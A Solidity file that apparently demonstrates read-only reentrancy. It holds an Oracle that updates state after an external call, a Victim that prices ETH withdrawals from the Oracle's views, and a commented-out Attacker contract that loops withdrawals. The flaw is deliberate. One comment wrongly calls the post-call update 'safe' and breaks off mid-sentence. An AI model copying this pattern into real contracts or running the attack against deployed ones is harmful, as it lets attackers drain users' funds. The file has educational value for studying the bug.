// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IStrategy {
    function execute() external;
}


contract Victim {
    Oracle public o;

    constructor(address _o) {
        o = Oracle(_o);
    }


    function withdraw() external returns (uint256) { // even if the victim correctly implements the reentracy guard, the attack still succeed
        uint256 rate = o.totalETHView() * 1e18 / o.totalSupplyView();
        uint256 amountETH = rate * 1000 / 1e18;

        //payable(msg.sender).transfer(amountETH);
        (bool success, ) = payable(msg.sender).call{value: amountETH}("");
        require (success, "Failed to withdraw ETH");

        return amountETH;
    }

    receive() external payable {}
}

// THIS is the contract vulnerable to reentrancy
contract Oracle {
    uint256 public totalETH;
    uint256 public totalSupply;
    bool private flag = false;

    modifier nonReentrant() {
        require(!flag, "Locked");
        flag = true;
        _;
        flag = false;
    }

    function work(address strategy) nonReentrant external payable {
        totalETH += msg.value;
        IStrategy(strategy).execute();
        totalSupply += msg.value;  // side-effect AFTER external call is safe because 
    }

    function totalETHView() external view returns (uint256) {
        return totalETH;
    }
    function totalSupplyView() external view returns (uint256) {
        return totalSupply;
    }
}

// CONTROL FLOW: A.execute() -> LOOP { V.withdraw() -> A.receive() -> O.work() -> A.execute() -> V.withdraw() ... }

// contract Attacker is IStrategy {
//     Victim public v;
//     Oracle_ree public o;

//     constructor(address payable _v, address _o) {
//         v = Victim(_v);
//         o = Oracle_ree(_o);
//     }

//     function execute() external {
//         v.withdraw();
//     }

//     receive() external payable {
//         o.work(address(this));
//     }
// }